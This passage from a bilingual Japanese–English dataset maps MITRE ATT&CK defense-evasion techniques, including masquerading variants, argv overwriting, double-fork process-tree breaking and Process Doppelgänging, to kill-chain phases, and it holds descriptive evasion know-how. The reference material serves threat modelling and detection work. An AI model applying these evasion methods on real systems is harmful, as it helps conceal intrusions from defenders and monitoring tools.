commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1036,マスカレード,Masquerading,"攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。

セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",T1036.005,正当なリソース名または場所との一致,Match Legitimate Resource Name or Location,"攻撃者は、ファイル、レジストリキー、またはその他のリソースに名前を付けたり配置したりする際に、正当なものの名前や場所と一致させたり近似させたりする可能性があります。これは、防御や監視を回避するために行われます。

これは、実行可能ファイルを一般的に信頼されているディレクトリ（例：System32配下）に配置したり、正当で信頼されているプログラムの名前（例：`svchost.exe`）を付けたりすることによって行われる場合があります。あるいは、Windowsレジストリキーに、正当なプログラムが使用するキーに近い近似値が与えられる場合もあります。コンテナ化された環境では、脅威アクターは信頼された名前空間またはコンテナポッドやクラスターの命名規則に一致する名前空間にリソースを作成する可能性があります。(引用: Aquasec Kubernetes Backdoor 2023)","Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation.

This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes Backdoor 2023)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1036,マスカレード,Masquerading,"攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。

セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",T1036.011,プロセス引数の上書き,Overwrite Process Arguments,"敵対者は、プロセスのメモリ内引数を変更して、正当または無害なプロセスに見えるように名前を変更する可能性があります。Linuxでは、オペレーティングシステムはコマンドライン引数をプロセスのスタックに格納し、`argv`配列として`main()`関数に渡します。最初の要素である`argv[0]`には、通常、プロセス名またはパスが含まれます。デフォルトでは、実際にプロセスを開始するために使用されたコマンド（例：`cat /etc/passwd`）です。デフォルトでは、Linuxの`/proc`ファイルシステムはこの値を使用してプロセス名を表します。`/proc/<PID>/cmdline`ファイルはこのメモリの内容を反映し、`ps`のようなツールはそれを使用してプロセス情報を表示します。引数は起動時にユーザースペースメモリに格納されるため、この変更は昇格された権限なしで実行できます。

実行時、攻撃者はプロセスのすべてのコマンドライン引数で使用されるメモリを消去し、各引数文字列をヌルバイトで上書きすることができます。これにより、プロセスが最初にどのように起動されたかの証拠が削除されます。その後、以前`argv[0]`が占有していたメモリ領域に偽装文字列を書き込み、`cat resolv.conf`のような無害なコマンドを模倣することができます。新しいコマンドライン文字列は`/proc/<PID>/cmdline`に反映され、`ps`のようなツールで表示されます。(引用: Sandfly BPFDoor 2022)(引用: Microsoft XorDdos Linux Stealth 2022)","Adversaries may modify a process's in-memory arguments to change its name in order to appear as a legitimate or benign process. On Linux, the operating system stores command-line arguments in the process’s stack and passes them to the `main()` function as the `argv` array. The first element, `argv[0]`, typically contains the process name or path - by default, the command used to actually start the process (e.g., `cat /etc/passwd`). By default, the Linux `/proc` filesystem uses this value to represent the process name. The `/proc/<PID>/cmdline` file reflects the contents of this memory, and tools like `ps` use it to display process information. Since arguments are stored in user-space memory at launch, this modification can be performed without elevated privileges.

During runtime, adversaries can erase the memory used by all command-line arguments for a process, overwriting each argument string with null bytes. This removes evidence of how the process was originally launched. They can then write a spoofed string into the memory region previously occupied by `argv[0]` to mimic a benign command, such as `cat resolv.conf`. The new command-line string is reflected in `/proc/<PID>/cmdline` and displayed by tools like `ps`.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1036,マスカレード,Masquerading,"攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。

セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",T1036.007,二重ファイル拡張子,Double File Extension,"攻撃者は、真のファイルタイプを偽装する手段として、ファイル名に二重拡張子を悪用する可能性があります。ファイル名には、最初の拡張子のみが表示される可能性のある2番目のファイルタイプ拡張子が含まれる場合があります（例：<code>File.txt.exe</code>は一部のビューでは<code>File.txt</code>としてのみレンダリングされる場合があります）。ただし、2番目の拡張子が、ファイルの開き方と実行方法を決定する真のファイルタイプです。実際のファイル拡張子は、オペレーティングシステムによってファイルブラウザ（例：explorer.exe）や、システムのポリシーと同様またはそれを使用して構成されたソフトウェアで非表示にされる場合があります。(引用: PCMag DoubleExtension)(引用: SOCPrime DoubleExtension)

攻撃者は、ペイロードの危険なファイルタイプを隠蔽しようとして二重拡張子を悪用する可能性があります。非常に一般的な使用法は、ユーザーを騙して無害なファイルタイプだと思わせて開かせ、実際には実行可能コードであるというものです。このようなファイルはしばしばメールの添付ファイルになりすまし、攻撃者が[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)を介してユーザーのシステムへの[初期アクセス](https://attack.mitre.org/tactics/TA0001)を取得し、その後[ユーザー実行](https://attack.mitre.org/techniques/T1204)を行うことを可能にします。例えば、<code>Evil.txt.exe</code>という名前の実行可能ファイル添付ファイルは、ユーザーには<code>Evil.txt</code>と表示される場合があります。その後、ユーザーはそれを無害なテキストファイルと見なして開き、意図せずに隠されたマルウェアを実行する可能性があります。(引用: SOCPrime DoubleExtension)

テキストファイル（.txt、.docなど）や画像ファイル（.jpg、.gifなど）などの一般的なファイルタイプは、通常、無害に見せるために最初の拡張子として使用されます。.exe、.lnk、.hta、.scrなど、一般的に危険と見なされる実行可能拡張子は、しばしば2番目の拡張子および真のファイルタイプとして表示されます。","Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension)

Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user’s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)

Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1036,マスカレード,Masquerading,"攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。

セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",T1036.010,アカウント名の偽装,Masquerade Account Name,"攻撃者は、新しく作成したアカウントを無害に見せるために、正当なアカウントの名前と一致させたり、近似させたりする可能性があります。これは通常、[アカウントの作成](https://attack.mitre.org/techniques/T1136)中に行われますが、アカウントは後で名前変更されることもあります。攻撃者が最初にアカウントを削除してから同じ名前で再作成する場合、これは[アカウントアクセスの削除](https://attack.mitre.org/techniques/T1531)と同時に発生する可能性もあります。(引用: Huntress MOVEit 2023)

多くの場合、攻撃者は、正当なソフトウェア、データバックアップ、またはコンテナクラスター管理に関連付けられているものなど、サービスアカウントになりすまそうとします。(引用: Elastic CUBA Ransomware 2022)(引用: Aquasec Kubernetes Attack 2023) また、「admin」、「help」、「root」など、一般的で信頼できる名前をアカウントに与えることもあります。(引用: Invictus IR Cloud Ransomware 2024) 場合によっては、攻撃者は[アカウントの発見](https://attack.mitre.org/techniques/T1087)の追跡行動として、システムに既に存在するアカウントをモデルにしたアカウント名を作成することもあります。

これは、ユーザー名やサービスアカウント名ではなく、特定の信頼できる個人や組織になりすますことを記述する[偽装](https://attack.mitre.org/techniques/T1656)とは異なることに注意してください。","Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during [Create Account](https://attack.mitre.org/techniques/T1136), although accounts may also be renamed at a later date. This may also coincide with [Account Access Removal](https://attack.mitre.org/techniques/T1531) if the actor first deletes an account before re-creating one with the same name.(Citation: Huntress MOVEit 2023)

Often, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management.(Citation: Elastic CUBA Ransomware 2022)(Citation: Aquasec Kubernetes Attack 2023) They may also give accounts generic, trustworthy names, such as “admin”, “help”, or “root.”(Citation: Invictus IR Cloud Ransomware 2024) Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior to [Account Discovery](https://attack.mitre.org/techniques/T1087).

Note that this is distinct from [Impersonation](https://attack.mitre.org/techniques/T1656), which describes impersonating specific trusted individuals or organizations, rather than user or service account names.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1036,マスカレード,Masquerading,"攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。

セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",T1036.001,無効なコード署名,Invalid Code Signature,"攻撃者は、ユーザー、アナリスト、またはツールを欺く可能性を高めるために、有効なコード署名の機能を模倣しようとする可能性があります。コード署名は、開発者からのバイナリの信頼性のレベルと、バイナリが改ざんされていないことの保証を提供します。攻撃者は署名済みプログラムからメタデータと署名情報をコピーし、それを未署名プログラムのテンプレートとして使用できます。無効なコード署名を持つファイルはデジタル署名検証チェックに失敗しますが、ユーザーにはより正当に見え、セキュリティツールがこれらのファイルを不適切に処理する可能性があります。(引用: Threatexpress MetaTwin 2017)

[コード署名](https://attack.mitre.org/techniques/T1553/002)とは異なり、このアクティビティは有効な署名にはなりません。","Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)

Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1036,マスカレード,Masquerading,"攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。

セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",T1036.009,プロセスツリーの破壊,Break Process Trees,"攻撃者は、実行されたマルウェアの親プロセスID（PPID）を変更することにより、プロセスツリーベースの分析を回避しようとする可能性があります。エンドポイント保護ソフトウェアが検出に「親子」関係を利用する場合、この関係を破壊すると、攻撃者の動作が以前のプロセスツリーアクティビティに関連付けられなくなる可能性があります。Unixベースのシステムでは、このプロセスツリーを破壊することは、管理者がスクリプトやプログラムを使用してソフトウェアを実行するための一般的な方法です。(引用: 3OHA double-fork 2022)

Linuxシステムでは、攻撃者は一連の[ネイティブAPI](https://attack.mitre.org/techniques/T1106)呼び出しを実行して、マルウェアのプロセスツリーを変更する可能性があります。例えば、攻撃者は引数なしでペイロードを実行し、`fork()` API呼び出しを2回呼び出し、その後親プロセスを終了させることができます。これにより、親プロセスのない孫プロセスが作成され、直ちに`init`システムプロセス（PID 1）によって養子縁組され、攻撃者のペイロードの実行を以前のプロセスツリーから正常に切断します。

別の例としては、「daemon」システムコールを使用して現在の親プロセスから切り離し、バックグラウンドで実行することが挙げられます。(引用: Sandfly BPFDoor 2022)(引用: Microsoft XorDdos Linux Stealth 2022)","An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the “parent-child\"" relationship for detection, breaking this relationship could result in the adversary’s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.(Citation: 3OHA double-fork 2022)

On Linux systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106) calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.

Another example is using the “daemon” syscall to detach from the current parent process and run in the background.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.013,プロセスドッペルゲンギング,Process Doppelgänging,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスドッペルゲンギングを介してプロセスに悪意のあるコードを注入する可能性があります。プロセスドッペルゲンギングは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。

Windows Transactional NTFS (TxF) は、安全なファイル操作を実行する手法としてVistaで導入されました。(引用: Microsoft TxF) データ整合性を確保するため、TxFは特定の時点でファイルに書き込むことができるトランザクションハンドルを1つだけにします。書き込みハンドルトランザクションが終了するまで、他のすべてのハンドルは書き込み元から分離され、ハンドルが開かれた時点で存在したファイルのコミット済みバージョンのみを読み取ることができます。(引用: Microsoft Basic TxF Concepts) 破損を避けるため、書き込みトランザクション中にシステムまたはアプリケーションに障害が発生した場合、TxFは自動ロールバックを実行します。(引用: Microsoft Where to use TxF)

非推奨ですが、TxFアプリケーションプログラミングインターフェイス（API）はWindows 10の時点でも有効です。(引用: BlackHat Process Doppelgänging Dec 2017)

攻撃者はTxFを悪用して、[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)のファイルレスバリエーションを実行する可能性があります。[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)と同様に、プロセスドッペルゲンギングは正当なプロセスのメモリを置き換え、防御や検出を回避する可能性のある悪意のあるコードの隠蔽された実行を可能にします。プロセスドッペルゲンギングによるTxFの使用は、<code>NtUnmapViewOfSection</code>、<code>VirtualProtectEx</code>、<code>SetThreadContext</code>などの監視の厳しいAPI関数の使用も回避します。(引用: BlackHat Process Doppelgänging Dec 2017)

プロセスドッペルゲンギングは4つのステップで実装されます(引用: BlackHat Process Doppelgänging Dec 2017):

* トランザクト – 正当な実行可能ファイルを使用してTxFトランザクションを作成し、その後、ファイルを悪意のあるコードで上書きします。これらの変更は分離され、トランザクションのコンテキスト内でのみ表示されます。
* ロード – メモリの共有セクションを作成し、悪意のある実行可能ファイルをロードします。
* ロールバック – 元の実行可能ファイルへの変更を元に戻し、ファイルシステムから悪意のあるコードを効果的に削除します。
* アニメート – 汚染されたメモリセクションからプロセスを作成し、実行を開始します。

